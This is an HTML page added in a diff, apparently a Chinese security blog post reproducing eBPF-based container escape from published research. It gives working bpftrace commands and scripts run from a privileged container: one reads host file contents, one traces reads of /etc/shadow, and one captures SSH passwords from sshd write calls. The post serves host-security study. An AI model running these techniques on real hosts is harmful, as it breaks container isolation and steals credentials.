@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"yoursite.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="背景Container escape in 2021 和 云原生安全攻防｜使用eBPF逃逸容器技术分析与实践 都提到了基于ebpf的容器逃逸。 本文简要记录自己对这两篇文章的学习、复现，并给出一个demo，希望对主机安全有兴趣的读者有点帮助。 快速验证”可以用ebpf在容器中读宿主机文件”Container escape in 2021 有一页PPT  你也可以输入以下命令，来复现上面”在容器中">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于ebpf的容器逃逸(上)">
+<meta property="og:url" content="http://yoursite.com/2022-07-29-%E5%9F%BA%E4%BA%8Eebpf%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8(%E4%B8%8A)/index.html">
+<meta property="og:site_name" content="leveryd的个人博客">
+<meta property="og:description" content="背景Container escape in 2021 和 云原生安全攻防｜使用eBPF逃逸容器技术分析与实践 都提到了基于ebpf的容器逃逸。 本文简要记录自己对这两篇文章的学习、复现，并给出一个demo，希望对主机安全有兴趣的读者有点帮助。 快速验证”可以用ebpf在容器中读宿主机文件”Container escape in 2021 有一页PPT  你也可以输入以下命令，来复现上面”在容器中">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://user-images.githubusercontent.com/1846319/182094230-dd1ca6f7-d970-417f-8d40-18739873e580.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/1846319/181756031-d22cec4c-9456-4a8e-9b0b-94e0512b7db7.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/1846319/182092087-d797efac-fc85-4b0b-b025-d13628f9eac9.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/1846319/182098510-d487a570-5c78-4620-ba82-87733a850f39.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/1846319/182009021-c0471216-1413-48a6-871d-43efaf3196b2.png">
+<meta property="article:published_time" content="2022-07-29T11:17:09.902Z">
+<meta property="article:modified_time" content="2022-08-03T02:17:31.247Z">
+<meta property="article:author" content="leveryd">
+<meta property="article:tag" content="主机安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/1846319/182094230-dd1ca6f7-d970-417f-8d40-18739873e580.png">
+
+
+<link rel="canonical" href="http://yoursite.com/2022-07-29-%E5%9F%BA%E4%BA%8Eebpf%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8(%E4%B8%8A)/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://yoursite.com/2022-07-29-%E5%9F%BA%E4%BA%8Eebpf%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8(%E4%B8%8A)/","path":"2022-07-29-基于ebpf的容器逃逸(上)/","title":"基于ebpf的容器逃逸(上)"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>基于ebpf的容器逃逸(上) | leveryd的个人博客</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">leveryd的个人博客</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-number">1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BF%AB%E9%80%9F%E9%AA%8C%E8%AF%81%E2%80%9D%E5%8F%AF%E4%BB%A5%E7%94%A8ebpf%E5%9C%A8%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%AF%BB%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%96%87%E4%BB%B6%E2%80%9D"><span class="nav-number">2.</span> <span class="nav-text">快速验证”可以用ebpf在容器中读宿主机文件”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E2%80%9D%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E2%80%9D"><span class="nav-number">3.</span> <span class="nav-text">验证”获取用户密码”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">leveryd</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">56</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-07-29-%E5%9F%BA%E4%BA%8Eebpf%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8(%E4%B8%8A)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          基于ebpf的容器逃逸(上)
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-07-29 19:17:09" itemprop="dateCreated datePublished" datetime="2022-07-29T19:17:09+08:00">2022-07-29</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-08-03 10:17:31" itemprop="dateModified" datetime="2022-08-03T10:17:31+08:00">2022-08-03</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><a target="_blank" rel="noopener" href="https://github.com/knownsec/KCon/blob/master/2021/Container%20escape%20in%202021.pdf">Container escape in 2021</a> 和 <a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/206">云原生安全攻防｜使用eBPF逃逸容器技术分析与实践</a> 都提到了基于ebpf的容器逃逸。</p>
+<p>本文简要记录自己对这两篇文章的学习、复现，并给出一个demo，希望对主机安全有兴趣的读者有点帮助。</p>
+<h1 id="快速验证”可以用ebpf在容器中读宿主机文件”"><a href="#快速验证”可以用ebpf在容器中读宿主机文件”" class="headerlink" title="快速验证”可以用ebpf在容器中读宿主机文件”"></a>快速验证”可以用ebpf在容器中读宿主机文件”</h1><p><a target="_blank" rel="noopener" href="https://github.com/knownsec/KCon/blob/master/2021/Container%20escape%20in%202021.pdf">Container escape in 2021</a> 有一页PPT</p>
+<p><img src="https://user-images.githubusercontent.com/1846319/182094230-dd1ca6f7-d970-417f-8d40-18739873e580.png"></p>
+<p>你也可以输入以下命令，来复现上面”在容器中观测到宿主机文件内容”的效果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# docker run -it --cap-add sys_admin --cap-add sys_resource quay.io&#x2F;iovisor&#x2F;bpftrace:latest bash</span><br><span class="line">root@6a6339858e9a:&#x2F;# mount -t debugfs none &#x2F;sys&#x2F;kernel&#x2F;debug</span><br><span class="line">root@6a6339858e9a:&#x2F;# export BPFTRACE_STRLEN&#x3D;200       &#x2F;&#x2F; https:&#x2F;&#x2F;github.com&#x2F;iovisor&#x2F;bpftrace&#x2F;blob&#x2F;master&#x2F;docs&#x2F;reference_guide.md#91-bpftrace_strlen</span><br><span class="line">root@6a6339858e9a:&#x2F;# bpftrace -e &#39;kretfunc:vfs_read &#x2F;comm&#x3D;&#x3D;&quot;cat&quot;&#x2F; &#123;printf(&quot;%s,%d\n&quot;,str(uptr(args-&gt;buf),retval),retval);&#125;&#39;</span><br><span class="line">Attaching 1 probe...</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://user-images.githubusercontent.com/1846319/181756031-d22cec4c-9456-4a8e-9b0b-94e0512b7db7.png"></p>
+<blockquote>
+<p>bpftrace可以参考<a target="_blank" rel="noopener" href="https://github.com/iovisor/bpftrace">官方文档</a></p>
+</blockquote>
+<p>上面是根据命令名来过滤，查看特定命令读取的文件内容。你也可以根据文件名来过滤。</p>
+<p>比如输入以下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv tmp]# docker run -it -v &#x2F;tmp:&#x2F;tmp --cap-add sys_admin --cap-add sys_resource quay.io&#x2F;iovisor&#x2F;bpftrace:latest bash</span><br><span class="line">root@b0e60d8c7219:&#x2F;# mount -t debugfs none &#x2F;sys&#x2F;kernel&#x2F;debug</span><br><span class="line">root@b0e60d8c7219:&#x2F;# export BPFTRACE_STRLEN&#x3D;150</span><br><span class="line">root@b0e60d8c7219:&#x2F;# bpftrace &#x2F;tmp&#x2F;1.bt</span><br><span class="line">Attaching 9 probes...</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://user-images.githubusercontent.com/1846319/182092087-d797efac-fc85-4b0b-b025-d13628f9eac9.png"></p>
+<p>1.bt 代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;Tracing file content... Hit Ctrl-C to end.\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tracepoint:syscalls:sys_enter_open,</span><br><span class="line">tracepoint:syscalls:sys_enter_openat</span><br><span class="line">&#x2F; strncmp(str(args-&gt;filename), &quot;&#x2F;etc&#x2F;shadow&quot;, 11) &#x3D;&#x3D; 0 &#x2F;      &#x2F;&#x2F; 待观测的文件路径</span><br><span class="line">&#123;</span><br><span class="line">	@filename[tid] &#x3D; args-&gt;filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tracepoint:syscalls:sys_exit_open,</span><br><span class="line">tracepoint:syscalls:sys_exit_openat</span><br><span class="line">&#x2F;@filename[tid]&#x2F;</span><br><span class="line">&#123;</span><br><span class="line">	$ret &#x3D; args-&gt;ret;</span><br><span class="line">	$fd &#x3D; $ret &gt; 0 ? $ret : -1;</span><br><span class="line"></span><br><span class="line">  @fd_filenmae_map[tid, $fd] &#x3D; @filename[tid];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tracepoint:syscalls:sys_enter_read</span><br><span class="line">&#x2F;@fd_filenmae_map[tid, args-&gt;fd]&#x2F;</span><br><span class="line">&#123;</span><br><span class="line">  @read_buf[tid] &#x3D; args-&gt;buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tracepoint:syscalls:sys_exit_read</span><br><span class="line">&#x2F;@read_buf[tid]&#x2F;</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;filename:%s, content:%s\n&quot;, str(@filename[tid]), str(uptr(@read_buf[tid])))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tracepoint:syscalls:sys_enter_close</span><br><span class="line">&#x2F;@fd_filenmae_map[tid, args-&gt;fd]&#x2F;</span><br><span class="line">&#123;</span><br><span class="line">  delete(@filename[tid]);</span><br><span class="line">  delete(@fd_filenmae_map[tid, args-&gt;fd]);</span><br><span class="line">  delete(@read_buf[tid]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">END</span><br><span class="line">&#123;</span><br><span class="line">	clear(@filename);</span><br><span class="line">  clear(@fd_filenmae_map);</span><br><span class="line">  clear(@read_buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="验证”获取用户密码”"><a href="#验证”获取用户密码”" class="headerlink" title="验证”获取用户密码”"></a>验证”获取用户密码”</h1><p>sshd write系统调用中会有ssh密码信息，如下<br><img src="https://user-images.githubusercontent.com/1846319/182098510-d487a570-5c78-4620-ba82-87733a850f39.png"></p>
+<p>所以，你可以在容器中用 ‘tracepoint:syscalls:sys_enter_write’ 来获取ssh密码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bpftrace -e &#39;tracepoint:syscalls:sys_enter_write &#x2F;comm&#x3D;&#x3D;&quot;sshd&quot;&#x2F; &#123;</span><br><span class="line">  if (args-&gt;fd &#x3D;&#x3D; 6)&#123;</span><br><span class="line">    printf(&quot;%s\n&quot;,str(args-&gt;buf+4));  &#x2F;&#x2F; 前四个字节是0</span><br><span class="line">  &#125;</span><br><span class="line">&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://user-images.githubusercontent.com/1846319/182009021-c0471216-1413-48a6-871d-43efaf3196b2.png"></p>
+<blockquote>
+<p>我测试的ssh是OpenSSH_8.0p1，可能你的ssh发行版和我不同，并不一定通过hook write系统调用来获取用户密码。</p>
+</blockquote>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>基于ebpf做容器逃逸时，重点是需要知道hook哪个函数。</p>
+<p>比如 <a target="_blank" rel="noopener" href="https://www.cnxct.com/container-escape-in-linux-kernel-space-by-ebpf">内核态eBPF程序实现容器逃逸与隐藏账号rootkit</a> 文章中是hook哪个函数呢？</p>
+<p>另一个重点是”ebpf怎么修改数据”。前面的两个例子都只用bpftrace观测数据，而没有修改<code>args-&gt;buf</code>中的数据。</p>
+<p><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/206">云原生安全攻防｜使用eBPF逃逸容器技术分析与实践</a> 、 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/EoiyhMIn6VpxWK92AZS_PQ">lkm和ebpf rootkit分析的简要记录</a> 的例子中都涉及到”ebpf修改数据”。</p>
+<p>bpftrace目前只有<code>override()</code>能修改部分<code>kprobes</code>的返回值，所以下一篇我会用<code>libbpf</code>演示”ebpf修改数据能造成什么效果”。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8/" rel="tag"># 主机安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022-07-27-lkm%E5%92%8Cebpf%20rootkit%E5%88%86%E6%9E%90%E7%9A%84%E7%AE%80%E8%A6%81%E8%AE%B0%E5%BD%95/" rel="prev" title="lkm和ebpf rootkit分析的简要记录">
+                  <i class="fa fa-chevron-left"></i> lkm和ebpf rootkit分析的简要记录
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">leveryd</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
